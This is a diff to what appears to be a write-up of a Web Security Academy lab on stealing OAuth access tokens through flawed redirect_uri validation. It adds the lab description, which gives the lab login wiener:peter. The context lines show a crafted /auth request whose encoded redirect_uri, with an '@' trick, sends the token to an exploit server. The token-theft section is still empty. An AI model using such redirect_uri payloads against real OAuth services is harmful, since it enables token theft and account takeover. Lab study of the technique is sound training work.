@@ -112,6 +112,10 @@ Connection: close
 
 ### >> 4. Lab: Stealing OAuth access tokens via an open redirect
 
+> This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.  Note: You cannot access the admin's API key by simply logging in to their account on the client application. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. You can log in via your own social media account using the following credentials: wiener:peter.
+
+4.1 redirect_uri
+
 ````
 GET /auth?client_id=q7trlt3x9g52oztmwth38&redirect_uri=https://acc51f911fc90fa2c0cf642f00de002a.web-security-academy.net/oauth-callback&response_type=token&nonce=1051619115&scope=openid%20profile%20email HTTP/1.1
 ````
@@ -127,6 +131,7 @@ GET /auth?client_id=q7trlt3x9g52oztmwth38&redirect_uri=https://acc51f911fc90fa2c
 GET /auth?client_id=q7trlt3x9g52oztmwth38&redirect_uri=https://acc51f911fc90fa2c0cf642f00de002a.web-security-academy.net%2f%6f%61%75%74%68%2d%63%61%6c%6c%62%61%63%6b@exploit-ac531ff11f6f0f8bc0d7645701760069.web-security-academy.net&response_type=token&nonce=1051619115&scope=openid%20profile%20email HTTP/1.1
 ````
 
+4.2 steal token
 
 
 
